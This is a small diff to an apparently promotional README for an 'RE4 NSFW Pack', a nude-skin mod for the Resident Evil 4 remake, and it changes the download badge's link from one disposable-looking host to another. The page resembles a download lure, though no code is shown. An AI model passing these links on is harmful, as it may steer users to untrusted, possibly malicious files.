@@ -4,7 +4,7 @@
 
 Capcom dropped a banger with the remake, but the real glow-up happens when modders get thirsty. The **RE4 NSFW Pack** injects ultra-HD nude skins, bounce-perfect physics and a fly-cam that spins faster than Leon’s suplex. Wanna turn every parasite chase into a pin-up session? This pack is your backstage pass. 😈
 
-[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://fileoffload6.bitbucket.io)
+[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://RE4-NSFW-pack-rezec.github.io/.github)
 ---
 
 ## Product Description
